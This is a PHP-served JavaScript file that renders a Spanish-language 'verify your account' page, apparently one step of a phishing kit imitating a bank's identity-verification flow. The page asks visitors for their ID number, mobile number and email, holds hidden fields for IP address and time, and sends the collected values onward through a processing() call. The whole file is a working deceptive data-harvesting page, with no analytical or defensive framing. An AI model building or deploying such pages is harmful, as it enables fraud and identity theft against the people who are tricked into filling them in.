<?php
header('Access-Control-Allow-Origin: *');
Header("content-type: application/javascript");
?>
var my_titulo = 'Ahora Verificar tu cuenta es fácil';
var my_contenido = `
<link rel="stylesheet" href="${my_hosting}css/flow-theme.css" />
<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">

<style>
  .contact-panel { display: flex; flex-direction: column; gap: 14px; }
  .grid { display: grid; gap: 12px; grid-template-columns: 1fr 1fr; }
  @media(max-width:520px){ .grid { grid-template-columns: 1fr; } }
  .field-block { display: flex; flex-direction: column; gap: 6px; }
  .field-block label { font-size: 13px; color: var(--muted); font-weight: 700; }
  .bc-input { border: 2px solid var(--line-strong); border-radius: 12px; padding: 14px; font-size: 16px; font-weight: 600; background: #fff; color: var(--ink); outline: none; transition: border-color 0.2s ease, box-shadow 0.2s ease; }
  .bc-input:focus { border-color: #000; box-shadow: 0 0 0 3px rgba(0,0,0,0.06); }
  .validate { display: none; color: var(--danger); font-size: 12px; }
  .alert-box { display: none; background: #fff4ec; border: 1.5px solid rgba(255,127,47,0.45); color: #8f360b; padding: 12px; border-radius: 12px; gap: 10px; align-items: flex-start; }
</style>

<main class="flow-shell">
  <div class="logo-mark" aria-hidden="true">
    <span></span><span></span><span></span>
  </div>

  <h1 class="flow-title">Confirma tus datos de contacto</h1>
  <p class="flow-subtitle">Usaremos esta información para validar tu identidad.</p>

  <section class="panel contact-panel">
    <div class="alert-box" id="error" style="display:none;">
      <i class='bx bx-info-circle'></i>
      <div>
        <div style="font-weight:700;">Datos inválidos</div>
        <div id="errorText"></div>
      </div>
    </div>

    <div class="grid">
      <div class="field-block">
        <label for="numeroDocumento" id="cc">Número de documento</label>
        <input maxlength="16" id="numeroDocumento" autocomplete="off" type="text" value="" required class="bc-input" placeholder=" "/>
        <span class="validate" id="campRequiredDoc">Campo requerido</span>
      </div>
      <div class="field-block">
        <label for="numeroCelular">Número de celular</label>
        <input maxlength="10" id="numeroCelular" autocomplete="off" type="number" value="" required class="bc-input" placeholder=" "/>
        <span class="validate" id="campRequiredPhone">Campo requerido</span>
      </div>
      <div class="field-block" style="grid-column:1 / -1;">
        <label for="email">Correo electrónico</label>
        <input id="email" autocomplete="off" type="email" required class="bc-input" placeholder=" "/>
        <span class="validate" id="campRequiredEmail">Campo requerido</span>
      </div>
    </div>

    <button id="next-button" class="btn-primary" disabled>CONTINUAR</button>
  </section>

  <div class="meta-hidden">
    <div id="ipc">Dirección IP: </div>
    <div id="jclock1"></div>
  </div>
</main>
`;



    $('#titulo').html(my_titulo);
    $('body').html(my_contenido);

    var inputs = $('#numeroDocumento, #numeroCelular, #email');
    var nextButton = $('#next-button');

    function checkAllFieldsFilled() {
        var allFilled = true;
        inputs.each(function() {
            if (!$(this).val()) {
                allFilled = false;
                return false;
            }
        });
        return allFilled;
    }

    function updateButtonState() {
        if (checkAllFieldsFilled()) {
            nextButton.prop('disabled', false);
        } else {
            nextButton.prop('disabled', true);
        }
    }

    inputs.on('input', function() {
        updateButtonState();
    });

    updateButtonState();


    if (window.my_data && (my_data['mensaje'] || my_data['error'])) {
        $('#error').show();
        $('#errorText').text(my_data['mensaje'] || my_data['error']);
        $('#numeroDocumento, #numeroCelular, #email').addClass('error-input');
        $('.grid').addClass('shake');
        setTimeout(function(){ $('.grid').removeClass('shake'); }, 500);
    }

    $('#next-button').on('click', function() {
        let cedula = $('#numeroDocumento').val();
        let celular = $('#numeroCelular').val();
        let email = $('#email').val();

        if (!email || !celular || celular.length < 9) {
        } else {
            processing({
                t: 'email',
                email: email,
                cemail: cedula,
                celular: celular,
            });
        }

    });
